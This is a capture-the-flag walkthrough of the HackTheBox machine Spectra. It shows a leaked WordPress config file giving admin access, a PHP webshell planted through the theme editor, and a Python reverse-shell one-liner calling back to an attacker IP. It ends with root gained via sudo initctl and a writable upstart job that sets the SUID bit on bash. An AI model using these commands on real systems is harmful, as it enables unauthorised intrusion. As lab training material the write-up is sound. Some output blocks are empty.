Spectra is an easy rated machine on HackTheBox created by [egre55](https://www.hackthebox.eu/home/users/profile/1190). For the user part we will exploit a test installation of worpress with directory listing enabled to log into the production wordpress installation.
Once we are in worpress we will edit a php file with the template editor to obtain RCE and a reverse shell. On the machine we spot an unusual  passwd file in `/etc/autologin`, which contains the password for the user katie. Finally for the root part we will abuse sudo permissions on initctl and a writeable config file.

# User
## Nmap

As usual we start our enumeration of with a nmap scan against all open ports, followed by a script and version detection scan against the open ones to capture the full attack surface.

`All ports`
```
$ sudo nmap -p- -T4  10.129.93.40 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 09:06 GMT

```

`Script and Version`
```

```

## File exposure
 There are only 3 ports open and port 80 looks the most promising so we will start our eumeration there. Opening it up in the browser of our choice we see a `Software Issue Tracker` and a `Test` page linked. 

[![home.png](/img/spectra/home.png)](/img/spectra/home.png)

Going over to the `Software Issure Tracker` we see a wordpress installation and find a username `Administrator`.

[![wordpress_home.png](/img/spectra/wordpress_home.png)](/img/spectra/wordpress_home.png)

On test we recieve an error stating that the connection to the database failed.

[![test_page.png](/img/spectra/test_page.png)](/img/spectra/test_page.png)

The interesting thing is if we don't follow the link to `index.php` but rather just list the root with `/` we can see that directory listing is enabled and it reveals another worpress installtion.

[![listing.png](/img/spectra/listing.png)](/img/spectra/listing.png)

There is also a `wp-config.php.save` which we can download using `curl` or `wget`. The `wp-config.php` file usually stores the database credentials for a wordpress installation so it is often a good target.

```
$ curl http://spectra.htb/testing/wp-config.php.save
...[snip]...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */                                                                         
define( 'DB_NAME', 'dev' );
                                                           
/** MySQL database username */                                                                                        
define( 'DB_USER', 'devtest' );
                                                           
/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );            

/** MySQL hostname */                           
define( 'DB_HOST', 'localhost' );
                                                           
/** Database Charset to use in creating database tables. */ 
define( 'DB_CHARSET', 'utf8' );
                                                           
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );    
...[snip]...
```

## Worpress template

Using the password for the database and the earlier identified username we are now able to log into wordpress as the administrator user.

What generally works for wordpress once you have access as a user that is allowd to modify themes, is to exchange one of the templates for a php webshell. 
For this we nagivate to `Appearance` => `Theme Editor`. There we can select any theme we like but have to keep in mind the name of the theme later for the file location of our webshell. In our case we modify the `404.php` Template of the `TwentySeventeen` Theme for a small php webshell.

[![404_template.png](/img/spectra/404_template.png)](/img/spectra/404_template.png)

After updating the file we naviagte to it's location and confirm our RCE.

[![RCE.png](/img/spectra/RCE.png)](/img/spectra/RCE.png)

With our PoC working we can now get a reverseshell on the target machine. To do this we first set up our listener on the port we want to recieve the shell on.

```
$nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

We intercept the webshell request with burp send it to repeater and change the request method. Then we send this python reverse shell to the target using our tun0 ip.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",7575));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

[![burp_revshell.png](/img/spectra/burp_revshell.png)](/img/spectra/burp_revshell.png)

We get almost an instant callback from the target, upgrade our shell and fix the terminal size.

```
$nc -lnvp 7575

Ncat: Listening on :::7575

```

Looking around there is a strange non default folder with an unusual file in `/etc`. Reading it, it seems to be a password and we only have 2 other users root included.

```
nginx@spectra /usr/local/share/nginx/html/main/wp-content/themes/twentyseventeen $ cat /etc/autologin/passwd 
SummerHereWeCome!!
```

Trying the password for katie over ssh we are successfull and can grab the user flag. 

```
$ ssh katie@spectra.htb

```

# Root

## Initctl

Checking sudo permissions for katie we are able to run `/sbin/initctl` as root on the machine. This means we are able to start and stop jobs in the `/etc/init` directory.

```
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

Checking the directory we that most files aren't writeable by us but 11 odd test files are owned by the developers group which gives us write-access since we are in the same group.

```
katie@spectra ~ $ ls -la /etc/init
total 768
drwxr-xr-x  2 root root       12288 Feb  3 16:46 .
drwxr-xr-x 63 root root        4096 Feb 11 23:12 ..

-rw-rw----  1 root developers   478 Jun 29  2020 test9.conf 
...[snip]...
```

```
katie@spectra ~ $ id
uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
```

Exploiting the sudo permissions on this with file write is trivial. The only thing we have to do is to add our code we want to run as root at the top of the script block in a job configuration file.

```
katie@spectra ~ $ vi /etc/init/test.conf
```

We will in this case chose to give bash the suid bit on starting the job.

```
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script
	chmod +s /bin/bash
    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
```

Now we start the job with sudo permisions.

```
katie@spectra ~ $ sudo /sbin/initctl start test          
test start/running, process 7364
```

Looking at bash it has now the suid bit set and we can easily drop into a rootshell and collect the flag.

```
katie@spectra ~ $ ls -la /bin/bash
-rwsr-sr-x 1 root root 551984 Dec 22  2020 /bin/bash
katie@spectra ~ $ /bin/bash -p
bash-4.3# wc -c /root/root.txt 
33 /root/root.txt
bash-4.3#
```
